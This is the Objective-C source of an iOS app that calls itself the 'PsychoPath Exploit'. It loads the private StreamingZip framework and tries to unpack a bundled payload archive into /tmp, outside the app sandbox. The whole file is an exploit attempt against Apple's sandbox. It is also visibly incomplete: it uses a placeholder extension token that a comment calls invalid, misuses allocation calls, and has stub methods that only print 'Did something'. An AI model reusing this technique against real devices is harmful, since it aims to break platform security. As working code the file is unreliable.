//
//  ViewController.m
//  amfetamine
//
//  Created by Sem Voigtländer on 19/11/2017.
//  Copyright © 2017 Sem Voigtländer. All rights reserved.
//

#import "ViewController.h"
#include <stdio.h>
#include <stdlib.h>
#define die() return;

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UIButton *exploit;
- (IBAction)doExploit:(id)sender;
@property int attempts;
@property long long sandboxToken;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.attempts = 0;
    // Do any additional setup after loading the view, typically from a nib.
    printf("=== PsychoPath Exploit ====\n");
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

BOOL loadPrivateAPIWithPath(NSString* path) {
    NSBundle* bundle = [NSBundle bundleWithPath:path];
    return [bundle load];
}

- (void) exit_with_failure:(NSString*)reason retry:(bool)retry{
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setTitle:reason forState:UIControlStateDisabled];
        [_exploit setEnabled:retry];
    });
}

- (void) change_exploit_status:(NSString*)status {
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setTitle:status forState:UIControlStateDisabled];
    });
}

- (IBAction)doExploit:(id)sender {
    printf("Welcome, starting exploit..\n");
    
    /* For iOS 10.3.2 and below use triple_fetch to escape sandbox and patch amfid */
    /* (...) */
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setEnabled:false];
        [_exploit setTitle:@"Starting..." forState:UIControlStateDisabled];
    });
    
    /* Load the private framework */
    BOOL loaded = loadPrivateAPIWithPath(@"/System/Library/PrivateFrameworks/StreamingZip.framework");
    
    /* Check if the framework is loaded, if not then abort the exploit */
    if(!loaded) {
        [self exit_with_failure:@"Unable to load PFW" retry:false];
        die();
    }
    
    printf("Loaded private framework...\n");
    [self change_exploit_status:@"Setting up..."];
    
    printf("Setting up symbols...\n");
    Class SZExtractor = NSClassFromString(@"SZExtractor");
    Class StreamingUnzipper = NSClassFromString(@"StreamingUnzipper");
    
    if(SZExtractor == nil || StreamingUnzipper == nil) {
        [self exit_with_failure:@"Symbols are null :(" retry:true];
        die();
    }
    
    printf("Created an StreamingUnzipper: %p\n",(void*)CFBridgingRetain(StreamingUnzipper));
    printf("Created an SZExtractor: %p\n",(void*)CFBridgingRetain(SZExtractor));
    printf("Setting our payload\n");
    
    /* Zipfile contains the files to be extracted to directory outside the sandbox */
    NSString* zipfile = [[NSBundle mainBundle] pathForResource:@"Payload" ofType:@"zip"];
    NSData *payload = [NSData dataWithContentsOfFile:zipfile]; //Convert the contents of the zip to a block of bytes
    
    /* Enable verbose extracting */
    [SZExtractor enableDebugLogging];
    
    /* Create a new SZExtractorDelegate with verbose mode enabled */
    id delegate = [[SZExtractor alloc] valueForKey:@"delegate"];
    [delegate enableDebugLogging];
    printf("Allocated an SZExtractorDelegate to SZExtractor\n");
    
    [self change_exploit_status:@"Setting up extractor"];
    
    /* Initialise with the /tmp path which is a writable directory outside the sandbox */
    [[delegate alloc] initForLocalExtractionWithPath:@"/tmp" options:nil];
    [[delegate alloc] supplyBytes:payload withCompletionBlock:^(void){
        printf("Successfully initialized!\n");
    }];
    
    printf("Adding a StreamingUnzipper to the SZExtractor\n");
    id inProcessUnzipper = [[SZExtractor alloc] valueForKey:@"_inProcessUnzipper"];
    inProcessUnzipper = [StreamingUnzipper alloc];
    [inProcessUnzipper supplyBytes:payload withReply:^(void){
        printf("Unzipping stuff to /tmp\n");
    }];
    
    /* Setting the actual unzipper with a path outside of the sandbox
     * Note: The sandbox extension token stil needs some work, and is invalid as for now
     */
    [inProcessUnzipper setupUnzipperWithOutputPath:@"/tmp" sandboxExtensionToken:"12345670" options:nil withReply:^(void){
        printf("Extracting payload..\n");
    }];
    
    [self change_exploit_status:@"Extracting to /tmp"];
    
    
    /* Cleaning up, were done now */
    
    SZExtractor = NULL;
    StreamingUnzipper = NULL;
    [self change_exploit_status:@"Done!"];
}

/* Used to enable verbose */
- (void)enableDebugLogging {
    
}

/* Needed to make the selectors work */
- (void)initForLocalExtractionWithPath:(id)arg1 options:(id)arg2 {
    printf("Did something\n");
    return;
}
- (void)setupUnzipperWithOutputPath:(id)arg1 sandboxExtensionToken:(char *)arg2 options:(id)arg3 withReply:(id)arg4 {
    printf("Did something\n");
    return;
}

- (void)supplyBytes:(id)arg1 withReply:(id /* block */)arg2 {
    printf("Did something\n");
}
- (void)supplyBytes:(id)arg1 withCompletionBlock:(id /* block */)arg2 {
    printf("Did something\n");
}
@end
